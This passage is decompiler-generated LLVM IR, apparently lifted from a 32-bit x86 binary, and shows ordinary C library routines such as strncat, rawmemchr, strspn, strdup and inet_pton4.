  %v15_805722f = icmp eq i8 %v2_805722e, %v4_805722f
  %v1_8057230 = icmp eq i1 %v15_805722f, false
  br i1 %v1_8057230, label %dec_label_pc_805723a, label %dec_label_pc_8057232

dec_label_pc_8057232:                             ; preds = %dec_label_pc_805722e
  %v3_805722e = zext i8 %v2_805722e to i32
  %v5_805722e = and i32 %v4_805722e, -256
  %v6_805722e = or i32 %v3_805722e, %v5_805722e
  %v23_805722f = add i32 %v20_805722f, %v9_805722e
  %v10_805722e = add i32 %v7_805722e, %v9_805722e
  %v4_8057232 = icmp eq i8 %v2_805722e, 0
  %v1_8057234 = icmp eq i1 %v4_8057232, false
  br i1 %v1_8057234, label %dec_label_pc_805722e, label %dec_label_pc_805723e

dec_label_pc_805723a:                             ; preds = %dec_label_pc_805722e
  br label %dec_label_pc_805723e

dec_label_pc_805723e:                             ; preds = %dec_label_pc_8057232, %dec_label_pc_805723a
  %storemerge = phi i32 [ 1, %dec_label_pc_805723a ], [ 0, %dec_label_pc_8057232 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805722e, { 1, 2, 0 }
  uselistorder i32 %v9_805722e, { 1, 0 }
  uselistorder label %dec_label_pc_805723e, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8057247 = load i32, i32* @esi, align 4
  store i32 %v0_8057247, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_805724b = ptrtoint i8* %tmp5 to i32
  store i32 %v4_805724b, i32* %esi.global-to-local, align 4
  %v4_8057253 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8057257 = call i32 @_strlen(i8* %v4_8057253)
  %v2_8057259 = add i32 %tmp, -1
  store i32 %v2_8057259, i32* %edi.global-to-local, align 4
  %v8_805725d13 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_805725d13, label %dec_label_pc_8057268, label %dec_label_pc_8057260.lr.ph

dec_label_pc_8057260.lr.ph:                       ; preds = %entry
  %v4_8057260.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8057260.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8057260

dec_label_pc_8057260:                             ; preds = %dec_label_pc_8057260.lr.ph, %dec_label_pc_8057260.dec_label_pc_805725d_crit_edge
  %v8_8057260 = phi i1 [ %v8_8057260.pre, %dec_label_pc_8057260.lr.ph ], [ %v5_8057261, %dec_label_pc_8057260.dec_label_pc_805725d_crit_edge ]
  %v4_8057260 = phi i32 [ %v4_8057260.pre, %dec_label_pc_8057260.lr.ph ], [ %v0_8057262, %dec_label_pc_8057260.dec_label_pc_805725d_crit_edge ]
  %v2_805726a15 = phi i32 [ %v2_8057259, %dec_label_pc_8057260.lr.ph ], [ %v7_8057261, %dec_label_pc_8057260.dec_label_pc_805725d_crit_edge ]
  %v0_8057260 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057260 = inttoptr i32 %v0_8057260 to i8*
  %v2_8057260 = load i8, i8* %v1_8057260, align 1
  %v3_8057260 = zext i8 %v2_8057260 to i32
  %v5_8057260 = and i32 %v4_8057260, -256
  %v6_8057260 = or i32 %v5_8057260, %v3_8057260
  store i32 %v6_8057260, i32* %eax.global-to-local, align 4
  %v9_8057260 = select i1 %v8_8057260, i32 -1, i32 1
  %v10_8057260 = add i32 %v9_8057260, %v0_8057260
  store i32 %v10_8057260, i32* %esi.global-to-local, align 4
  %v3_8057261 = inttoptr i32 %v2_805726a15 to i8*
  store i8 %v2_8057260, i8* %v3_8057261, align 1
  %v4_8057261 = load i32, i32* %edi.global-to-local, align 4
  %v5_8057261 = load i1, i1* @df, align 1
  %v6_8057261 = select i1 %v5_8057261, i32 -1, i32 1
  %v7_8057261 = add i32 %v6_8057261, %v4_8057261
  store i32 %v7_8057261, i32* %edi.global-to-local, align 4
  %v0_8057262 = load i32, i32* %eax.global-to-local, align 4
  %v3_8057262 = trunc i32 %v0_8057262 to i8
  %v4_8057262 = icmp eq i8 %v3_8057262, 0
  %v1_8057264 = icmp eq i1 %v4_8057262, false
  br i1 %v1_8057264, label %dec_label_pc_8057260.dec_label_pc_805725d_crit_edge, label %dec_label_pc_805726b

dec_label_pc_8057260.dec_label_pc_805725d_crit_edge: ; preds = %dec_label_pc_8057260
  %v0_805725d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_805725d = add i32 %v0_805725d.pre, -1
  %v8_805725d = icmp eq i32 %v1_805725d, 0
  store i32 %v1_805725d, i32* %ecx.global-to-local, align 4
  br i1 %v8_805725d, label %dec_label_pc_8057268, label %dec_label_pc_8057260

dec_label_pc_8057268:                             ; preds = %dec_label_pc_8057260.dec_label_pc_805725d_crit_edge, %entry
  %v2_805726a.lcssa = phi i32 [ %v2_8057259, %entry ], [ %v7_8057261, %dec_label_pc_8057260.dec_label_pc_805725d_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_805726a = inttoptr i32 %v2_805726a.lcssa to i8*
  store i8 0, i8* %v3_805726a, align 1
  %v4_805726a = load i32, i32* %edi.global-to-local, align 4
  %v5_805726a = load i1, i1* @df, align 1
  %v6_805726a = select i1 %v5_805726a, i32 -1, i32 1
  %v7_805726a = add i32 %v6_805726a, %v4_805726a
  store i32 %v7_805726a, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805726b

dec_label_pc_805726b:                             ; preds = %dec_label_pc_8057260, %dec_label_pc_8057268
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_805726f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805726f, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_805725d, { 1, 0 }
  uselistorder i32 %v0_8057262, { 1, 0 }
  uselistorder i32 %v7_8057261, { 0, 2, 1 }
  uselistorder i1 %v5_8057261, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805726b, { 1, 0 }
  uselistorder label %dec_label_pc_8057260, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8057275 = load i32, i32* @ebx, align 4
  %v4_8057276 = urem i32 %arg2, 256
  %v4_805727a = ptrtoint i8* %arg1 to i32
  %v2_80572853 = urem i32 %v4_805727a, 4
  %v3_80572854 = icmp eq i32 %v2_80572853, 0
  %v1_80572878 = icmp eq i1 %v3_80572854, false
  %v4_8057280 = trunc i32 %arg2 to i8
  br i1 %v1_80572878, label %dec_label_pc_8057280, label %dec_label_pc_8057289

dec_label_pc_8057280:                             ; preds = %entry, %dec_label_pc_8057284
  %v0_8057284 = phi i32 [ %v1_8057284, %dec_label_pc_8057284 ], [ %v4_805727a, %entry ]
  %v1_8057280 = inttoptr i32 %v0_8057284 to i8*
  %v2_8057280 = load i8, i8* %v1_8057280, align 1
  %v15_8057280 = icmp eq i8 %v2_8057280, %v4_8057280
  br i1 %v15_8057280, label %dec_label_pc_80572d4, label %dec_label_pc_8057284

dec_label_pc_8057284:                             ; preds = %dec_label_pc_8057280
  %v1_8057284 = add i32 %v0_8057284, 1
  %v2_8057285 = urem i32 %v1_8057284, 4
  %v3_8057285 = icmp eq i32 %v2_8057285, 0
  %v1_8057287 = icmp eq i1 %v3_8057285, false
  br i1 %v1_8057287, label %dec_label_pc_8057280, label %dec_label_pc_8057289

dec_label_pc_8057289:                             ; preds = %entry, %dec_label_pc_8057284
  %v0_805728c = phi i32 [ %v1_8057284, %dec_label_pc_8057284 ], [ %v4_805727a, %entry ]
  %v2_8057290 = mul nuw nsw i32 %v4_8057276, 256
  %v2_8057293 = or i32 %v2_8057290, %v4_8057276
  %v2_8057297 = mul i32 %v2_8057293, 65536
  %v2_805729a = or i32 %v2_8057297, %v2_8057293
  br label %dec_label_pc_805729c

dec_label_pc_805729c:                             ; preds = %dec_label_pc_80572cc, %dec_label_pc_805729c, %dec_label_pc_8057289
  %v0_80572a0 = phi i32 [ %v0_805728c, %dec_label_pc_8057289 ], [ %v1_80572a0, %dec_label_pc_805729c ], [ %v1_80572a0, %dec_label_pc_80572cc ]
  %v2_805729e = inttoptr i32 %v0_80572a0 to i32*
  %v3_805729e = load i32, i32* %v2_805729e, align 4
  %v4_805729e = xor i32 %v3_805729e, %v2_805729a
  %v1_80572a0 = add i32 %v0_80572a0, 4
  store i32 %v1_80572a0, i32* @ecx, align 4
  %v1_80572a3 = add i32 %v4_805729e, 2130640639
  %v1_80572a9 = sub i32 -1, %v4_805729e
  store i32 %v1_80572a9, i32* @edx, align 4
  %v2_80572ab = xor i32 %v1_80572a3, %v1_80572a9
  %v1_80572ad = and i32 %v2_80572ab, -2130640640
  %v2_80572ad = icmp eq i32 %v1_80572ad, 0
  br i1 %v2_80572ad, label %dec_label_pc_805729c, label %dec_label_pc_80572b4

dec_label_pc_80572b4:                             ; preds = %dec_label_pc_805729c
  %v2_80572b4 = inttoptr i32 %v0_80572a0 to i8*
  %v3_80572b4 = load i8, i8* %v2_80572b4, align 1
  %v16_80572b4 = icmp eq i8 %v3_80572b4, %v4_8057280
  br i1 %v16_80572b4, label %dec_label_pc_80572d4, label %dec_label_pc_80572bc

dec_label_pc_80572bc:                             ; preds = %dec_label_pc_80572b4
  %v1_80572bc = add i32 %v0_80572a0, 1
  %v2_80572bc = inttoptr i32 %v1_80572bc to i8*
  %v3_80572bc = load i8, i8* %v2_80572bc, align 1
  %v16_80572bc = icmp eq i8 %v3_80572bc, %v4_8057280
  br i1 %v16_80572bc, label %dec_label_pc_80572d4, label %dec_label_pc_80572c4

dec_label_pc_80572c4:                             ; preds = %dec_label_pc_80572bc
  %v1_80572c4 = add i32 %v0_80572a0, 2
  %v2_80572c4 = inttoptr i32 %v1_80572c4 to i8*
  %v3_80572c4 = load i8, i8* %v2_80572c4, align 1
  %v16_80572c4 = icmp eq i8 %v3_80572c4, %v4_8057280
  br i1 %v16_80572c4, label %dec_label_pc_80572d4, label %dec_label_pc_80572cc

dec_label_pc_80572cc:                             ; preds = %dec_label_pc_80572c4
  %v1_80572cc = add i32 %v0_80572a0, 3
  %v2_80572cc = inttoptr i32 %v1_80572cc to i8*
  %v3_80572cc = load i8, i8* %v2_80572cc, align 1
  %v16_80572cc = icmp eq i8 %v3_80572cc, %v4_8057280
  %v1_80572d2 = icmp eq i1 %v16_80572cc, false
  br i1 %v1_80572d2, label %dec_label_pc_805729c, label %dec_label_pc_80572d4

dec_label_pc_80572d4:                             ; preds = %dec_label_pc_8057280, %dec_label_pc_80572cc, %dec_label_pc_80572c4, %dec_label_pc_80572bc, %dec_label_pc_80572b4
  %v0_80572d6 = phi i32 [ %v1_80572cc, %dec_label_pc_80572cc ], [ %v1_80572c4, %dec_label_pc_80572c4 ], [ %v1_80572bc, %dec_label_pc_80572bc ], [ %v0_80572a0, %dec_label_pc_80572b4 ], [ %v0_8057284, %dec_label_pc_8057280 ]
  store i32 %v0_8057275, i32* @ebx, align 4
  ret i32 %v0_80572d6

; uselistorder directives
  uselistorder i32 %v1_80572a9, { 1, 0 }
  uselistorder i32 %v1_80572a0, { 2, 1, 0 }
  uselistorder i32 %v2_8057293, { 1, 0 }
  uselistorder i32 %v1_8057284, { 1, 0, 2 }
  uselistorder i8 %v4_8057280, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_805727a, { 2, 1, 0 }
  uselistorder i32 %v4_8057276, { 1, 0 }
  uselistorder i32 -2130640640, { 1, 0 }
  uselistorder i32 2130640639, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80572d4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8057289, { 1, 0 }
  uselistorder label %dec_label_pc_8057280, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_80572fa31 = load i8, i8* %arg1, align 1
  %v4_80572fc35 = icmp eq i8 %v2_80572fa31, 0
  br i1 %v4_80572fc35, label %dec_label_pc_8057304, label %dec_label_pc_8057300.lr.ph

dec_label_pc_8057300.lr.ph:                       ; preds = %entry
  %v3_80572fa32 = zext i8 %v2_80572fa31 to i32
  %v4_80572fa.pre = load i32, i32* @eax, align 4
  %v5_80572fa33 = and i32 %v4_80572fa.pre, -256
  %v6_80572fa34 = or i32 %v3_80572fa32, %v5_80572fa33
  %v4_80572e1 = ptrtoint i8* %arg1 to i32
  %v1_80572ec18 = inttoptr i32 %arg2 to i8*
  %v4_80572ec.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8057300

dec_label_pc_80572e7:                             ; preds = %dec_label_pc_8057300, %dec_label_pc_80572eb
  %v6_80572ec28 = phi i32 [ %v6_80572ec, %dec_label_pc_80572eb ], [ %v6_80572ec22, %dec_label_pc_8057300 ]
  %v2_80572ec27 = phi i8 [ %v2_80572ec, %dec_label_pc_80572eb ], [ %v2_80572ec19, %dec_label_pc_8057300 ]
  %v0_80572eb26 = phi i32 [ %v1_80572eb, %dec_label_pc_80572eb ], [ %arg2, %dec_label_pc_8057300 ]
  %v15_80572e7 = icmp eq i8 %v2_80572fa39, %v2_80572ec27
  br i1 %v15_80572e7, label %dec_label_pc_80572f4, label %dec_label_pc_80572eb

dec_label_pc_80572eb:                             ; preds = %dec_label_pc_80572e7
  %v1_80572eb = add i32 %v0_80572eb26, 1
  store i32 %v1_80572eb, i32* @edx, align 4
  %v1_80572ec = inttoptr i32 %v1_80572eb to i8*
  %v2_80572ec = load i8, i8* %v1_80572ec, align 1
  %v3_80572ec = zext i8 %v2_80572ec to i32
  %v5_80572ec = and i32 %v6_80572ec28, -256
  %v6_80572ec = or i32 %v3_80572ec, %v5_80572ec
  store i32 %v6_80572ec, i32* @ecx, align 4
  %v4_80572ee = icmp eq i8 %v2_80572ec, 0
  %v1_80572f0 = icmp eq i1 %v4_80572ee, false
  br i1 %v1_80572f0, label %dec_label_pc_80572e7, label %dec_label_pc_8057304

dec_label_pc_80572f4:                             ; preds = %dec_label_pc_80572e7
  %v1_80572f8 = add i32 %v0_805730537, 1
  %v1_80572f9 = add i32 %v0_80572f938, 1
  %v1_80572fa = inttoptr i32 %v1_80572f9 to i8*
  %v2_80572fa = load i8, i8* %v1_80572fa, align 1
  %v3_80572fa = zext i8 %v2_80572fa to i32
  %v5_80572fa = and i32 %v6_80572fa40, -256
  %v6_80572fa = or i32 %v3_80572fa, %v5_80572fa
  %v4_80572fc = icmp eq i8 %v2_80572fa, 0
  br i1 %v4_80572fc, label %dec_label_pc_8057304, label %dec_label_pc_8057300

dec_label_pc_8057300:                             ; preds = %dec_label_pc_8057300.lr.ph, %dec_label_pc_80572f4
  %v4_80572ec.pre = phi i32 [ %v4_80572ec.pre.pre, %dec_label_pc_8057300.lr.ph ], [ %v6_80572ec28, %dec_label_pc_80572f4 ]
  %v6_80572fa40 = phi i32 [ %v6_80572fa34, %dec_label_pc_8057300.lr.ph ], [ %v6_80572fa, %dec_label_pc_80572f4 ]
  %v2_80572fa39 = phi i8 [ %v2_80572fa31, %dec_label_pc_8057300.lr.ph ], [ %v2_80572fa, %dec_label_pc_80572f4 ]
  %v0_80572f938 = phi i32 [ %v4_80572e1, %dec_label_pc_8057300.lr.ph ], [ %v1_80572f9, %dec_label_pc_80572f4 ]
  %v0_805730537 = phi i32 [ 0, %dec_label_pc_8057300.lr.ph ], [ %v1_80572f8, %dec_label_pc_80572f4 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_80572ec19 = load i8, i8* %v1_80572ec18, align 1
  %v3_80572ec20 = zext i8 %v2_80572ec19 to i32
  %v5_80572ec21 = and i32 %v4_80572ec.pre, -256
  %v6_80572ec22 = or i32 %v3_80572ec20, %v5_80572ec21
  store i32 %v6_80572ec22, i32* @ecx, align 4
  %v4_80572ee23 = icmp eq i8 %v2_80572ec19, 0
  %v1_80572f025 = icmp eq i1 %v4_80572ee23, false
  br i1 %v1_80572f025, label %dec_label_pc_80572e7, label %dec_label_pc_8057304

dec_label_pc_8057304:                             ; preds = %entry, %dec_label_pc_80572f4, %dec_label_pc_8057300, %dec_label_pc_80572eb
  %v0_805730517 = phi i32 [ %v0_805730537, %dec_label_pc_80572eb ], [ %v0_805730537, %dec_label_pc_8057300 ], [ 0, %entry ], [ %v1_80572f8, %dec_label_pc_80572f4 ]
  ret i32 %v0_805730517

; uselistorder directives
  uselistorder i32 %v6_80572ec22, { 1, 0 }
  uselistorder i8 %v2_80572ec19, { 1, 2, 0 }
  uselistorder i32 %v1_80572f9, { 1, 0 }
  uselistorder i32 %v6_80572ec, { 1, 0 }
  uselistorder i8 %v2_80572ec, { 1, 2, 0 }
  uselistorder i32 %v1_80572eb, { 2, 1, 0 }
  uselistorder i8 %v2_80572fa31, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8057304, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8057300, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805730c = load i32, i32* @edi, align 4
  %v0_805730d = load i32, i32* @esi, align 4
  %v0_805730e = load i32, i32* @ebx, align 4
  store i32 %v0_805730e, i32* %stack_var_-12, align 4
  %v4_805730f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805730f, i32* @edi, align 4
  %v3_8057317 = call i32 @strlen(i8* %arg1)
  %v1_805731c = add i32 %v3_8057317, 1
  store i32 %v1_805731c, i32* @esi, align 4
  %v2_8057322 = call i32 @malloc(i32 %v1_805731c)
  %v1_805732a = icmp eq i32 %v2_8057322, 0
  store i32 %v2_8057322, i32* %ebx.global-to-local, align 4
  br i1 %v1_805732a, label %dec_label_pc_805733c, label %dec_label_pc_8057330

dec_label_pc_8057330:                             ; preds = %entry
  %v0_8057331 = load i32, i32* @esi, align 4
  %v0_8057332 = load i32, i32* @edi, align 4
  %tmp12 = inttoptr i32 %v2_8057322 to i16*
  %v6_8057334 = call i32 @memcpy(i16* %tmp12, i32 %v0_8057332, i32 %v0_8057331)
  %v0_805733c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805733c

dec_label_pc_805733c:                             ; preds = %entry, %dec_label_pc_8057330
  %v0_805733c = phi i32 [ 0, %entry ], [ %v0_805733c.pre, %dec_label_pc_8057330 ]
  %v2_805733e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805733e, i32* @ebx, align 4
  store i32 %v0_805730d, i32* @esi, align 4
  store i32 %v0_805730c, i32* @edi, align 4
  ret i32 %v0_805733c

; uselistorder directives
  uselistorder i32 %v2_8057322, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 12, 9, 8, 6, 5, 4, 1, 11, 10, 17, 16, 15, 14, 13, 7, 3, 2, 0 }
  uselistorder label %dec_label_pc_805733c, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_805734a = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_805734d = load i32, i32* @ebx, align 4
  store i32 %v0_805734d, i32* %stack_var_-16, align 4
  %v0_805734e = load i32, i32* @eax, align 4
  store i32 %v0_805734e, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_8057350 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8057353 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8057353, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_805739b15 = inttoptr i32 %v0_805734e to i8*
  %v2_805739b16 = load i8, i8* %v1_805739b15, align 1
  %v3_805739b17 = sext i8 %v2_805739b16 to i32
  store i32 %v3_805739b17, i32* @ecx, align 4
  %v1_805739e18 = add i32 %v0_805734e, 1
  store i32 %v1_805739e18, i32* %ebx.global-to-local, align 4
  %v1_805739f19 = icmp eq i8 %v2_805739b16, 0
  store i1 %v1_805739f19, i1* %zf.global-to-local, align 1
  %v1_80573a121 = icmp eq i1 %v1_805739f19, false
  br i1 %v1_80573a121, label %dec_label_pc_805735e, label %dec_label_pc_80573a3

dec_label_pc_805735e:                             ; preds = %entry, %dec_label_pc_805739b.backedge
  %v3_805739b23 = phi i32 [ %v3_805739b, %dec_label_pc_805739b.backedge ], [ %v3_805739b17, %entry ]
  %v2_805739b22 = phi i8 [ %v2_805739b, %dec_label_pc_805739b.backedge ], [ %v2_805739b16, %entry ]
  %v1_805735e = add nsw i32 %v3_805739b23, -48
  store i32 %v1_805735e, i32* @eax, align 4
  %v9_8057361 = icmp eq i8 %v2_805739b22, 57
  store i1 %v9_8057361, i1* %zf.global-to-local, align 1
  %v6_8057364 = icmp ugt i32 %v1_805735e, 9
  br i1 %v6_8057364, label %dec_label_pc_8057387, label %dec_label_pc_8057366

dec_label_pc_8057366:                             ; preds = %dec_label_pc_805735e
  %v0_8057366 = load i32, i32* @esi, align 4
  %v1_8057366 = inttoptr i32 %v0_8057366 to i8*
  %v2_8057366 = load i8, i8* %v1_8057366, align 1
  %v2_8057369 = zext i8 %v2_8057366 to i32
  %v3_8057369 = mul nuw nsw i32 %v2_8057369, 10
  %v3_805736c = add nsw i32 %v3_8057369, %v1_805735e
  store i32 %v3_805736c, i32* @eax, align 4
  %v9_8057370 = icmp eq i32 %v3_805736c, 255
  store i1 %v9_8057370, i1* %zf.global-to-local, align 1
  %v6_8057375 = icmp ugt i32 %v3_805736c, 255
  br i1 %v6_8057375, label %dec_label_pc_80573c0, label %dec_label_pc_8057377

dec_label_pc_8057377:                             ; preds = %dec_label_pc_8057366
  %v0_8057377 = load i32, i32* @edx, align 4
  %v1_8057377 = icmp eq i32 %v0_8057377, 0
  store i1 %v1_8057377, i1* %zf.global-to-local, align 1
  %v1_8057379 = trunc i32 %v3_805736c to i8
  store i8 %v1_8057379, i8* %v1_8057366, align 1
  %v0_805737b = load i1, i1* %zf.global-to-local, align 1
  %v1_805737b = icmp eq i1 %v0_805737b, false
  br i1 %v1_805737b, label %dec_label_pc_805739b.backedge, label %dec_label_pc_805737d

dec_label_pc_805737d:                             ; preds = %dec_label_pc_8057377
  %v0_805737d = load i32, i32* @edi, align 4
  %v1_805737d = add i32 %v0_805737d, 1
  store i32 %v1_805737d, i32* @edi, align 4
  %v1_805737e = add i32 %v0_805737d, -3
  %v6_805737e = sub i32 2, %v0_805737d
  %v7_805737e = and i32 %v6_805737e, %v1_805737d
  %v8_805737e = icmp slt i32 %v7_805737e, 0
  %v9_805737e = icmp eq i32 %v1_805737e, 0
  store i1 %v9_805737e, i1* %zf.global-to-local, align 1
  %v10_805737e = icmp slt i32 %v1_805737e, 0
  %v3_8057381 = icmp eq i1 %v10_805737e, %v8_805737e
  %v4_8057381 = icmp eq i1 %v9_805737e, false
  %v5_8057381 = and i1 %v4_8057381, %v3_8057381
  br i1 %v5_8057381, label %dec_label_pc_80573c0, label %dec_label_pc_8057383

dec_label_pc_8057383:                             ; preds = %dec_label_pc_805737d
  %v0_8057383 = load i32, i32* @edx, align 4
  %v1_8057383 = and i32 %v0_8057383, -256
  %v2_8057383 = or i32 %v1_8057383, 1
  store i32 %v2_8057383, i32* @edx, align 4
  br label %dec_label_pc_805739b.backedge

dec_label_pc_8057387:                             ; preds = %dec_label_pc_805735e
  %v9_8057387 = icmp eq i8 %v2_805739b22, 46
  store i1 %v9_8057387, i1* %zf.global-to-local, align 1
  %v1_805738a = icmp eq i1 %v9_8057387, false
  br i1 %v1_805738a, label %dec_label_pc_80573c0, label %dec_label_pc_805738c

dec_label_pc_805738c:                             ; preds = %dec_label_pc_8057387
  %v0_805738c = load i32, i32* @edx, align 4
  %v1_805738c = icmp eq i32 %v0_805738c, 0
  store i1 %v1_805738c, i1* %zf.global-to-local, align 1
  br i1 %v1_805738c, label %dec_label_pc_80573c0, label %dec_label_pc_8057390

dec_label_pc_8057390:                             ; preds = %dec_label_pc_805738c
  %v0_8057390 = load i32, i32* @edi, align 4
  %v9_8057390 = icmp eq i32 %v0_8057390, 4
  store i1 %v9_8057390, i1* %zf.global-to-local, align 1
  br i1 %v9_8057390, label %dec_label_pc_80573c0, label %dec_label_pc_8057395

dec_label_pc_8057395:                             ; preds = %dec_label_pc_8057390
  %v0_8057395 = load i32, i32* @esi, align 4
  %v1_8057395 = add i32 %v0_8057395, 1
  store i32 %v1_8057395, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_8057398 = inttoptr i32 %v1_8057395 to i8*
  store i8 0, i8* %v1_8057398, align 1
  br label %dec_label_pc_805739b.backedge

dec_label_pc_805739b.backedge:                    ; preds = %dec_label_pc_8057395, %dec_label_pc_8057383, %dec_label_pc_8057377
  %v0_805739b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805739b = inttoptr i32 %v0_805739b.pre to i8*
  %v2_805739b = load i8, i8* %v1_805739b, align 1
  %v3_805739b = sext i8 %v2_805739b to i32
  store i32 %v3_805739b, i32* @ecx, align 4
  %v1_805739e = add i32 %v0_805739b.pre, 1
  store i32 %v1_805739e, i32* %ebx.global-to-local, align 4
  %v1_805739f = icmp eq i8 %v2_805739b, 0
  store i1 %v1_805739f, i1* %zf.global-to-local, align 1
  %v1_80573a1 = icmp eq i1 %v1_805739f, false
  br i1 %v1_80573a1, label %dec_label_pc_805735e, label %dec_label_pc_805739b.dec_label_pc_80573a3_crit_edge

dec_label_pc_805739b.dec_label_pc_80573a3_crit_edge: ; preds = %dec_label_pc_805739b.backedge
  %v0_80573a3.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80573a3

dec_label_pc_80573a3:                             ; preds = %dec_label_pc_805739b.dec_label_pc_80573a3_crit_edge, %entry
  %v0_80573a3 = phi i32 [ %v0_80573a3.pre, %dec_label_pc_805739b.dec_label_pc_80573a3_crit_edge ], [ 0, %entry ]
  %v10_80573a3 = icmp eq i32 %v0_80573a3, 3
  store i1 %v10_80573a3, i1* %zf.global-to-local, align 1
  %v7_80573a6 = icmp sgt i32 %v0_80573a3, 3
  br i1 %v7_80573a6, label %dec_label_pc_80573a8, label %dec_label_pc_80573c0

dec_label_pc_80573a8:                             ; preds = %dec_label_pc_80573a3
  %v0_80573a8 = load i32, i32* @eax, align 4
  %v3_80573b1 = bitcast i32* %stack_var_-20 to i16*
  %v4_80573b1 = call i32 @memcpy(i16* %v3_80573b1, i32 4, i32 %v0_80573a8)
  %v0_80573bb = load i32, i32* @esp, align 4
  %v6_80573bb = icmp eq i32 %v0_80573bb, -16
  store i1 %v6_80573bb, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80573c2

dec_label_pc_80573c0:                             ; preds = %dec_label_pc_8057390, %dec_label_pc_805738c, %dec_label_pc_8057387, %dec_label_pc_805737d, %dec_label_pc_8057366, %dec_label_pc_80573a3
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_80573c2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80573c2

dec_label_pc_80573c2:                             ; preds = %dec_label_pc_80573a8, %dec_label_pc_80573c0
  %v0_80573c2 = phi i32 [ %v15_8057350, %dec_label_pc_80573a8 ], [ %v0_80573c2.pre, %dec_label_pc_80573c0 ]
  %v0_80573c9 = phi i32 [ 1, %dec_label_pc_80573a8 ], [ 0, %dec_label_pc_80573c0 ]
  %v9_80573c2 = icmp eq i32 %v0_80573c2, -28
  store i1 %v9_80573c2, i1* %zf.global-to-local, align 1
  %v2_80573c5 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80573c5, i32* @ebx, align 4
  store i32 %v0_805734a, i32* @esi, align 4
  ret i32 %v0_80573c9

; uselistorder directives
  uselistorder i32 %v0_80573a3, { 1, 0 }
  uselistorder i32 %v3_805739b, { 1, 0 }
  uselistorder i8 %v2_805739b, { 1, 2, 0 }
  uselistorder i1 %v9_8057390, { 1, 0 }
  uselistorder i32 %v1_805737e, { 1, 0 }
  uselistorder i32 %v3_805736c, { 1, 2, 0, 3 }
  uselistorder i8 %v2_805739b22, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 14 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 255, { 4, 2, 1, 0, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_80573c2, { 1, 0 }
  uselistorder label %dec_label_pc_80573c0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_805735e, { 1, 0 }
}

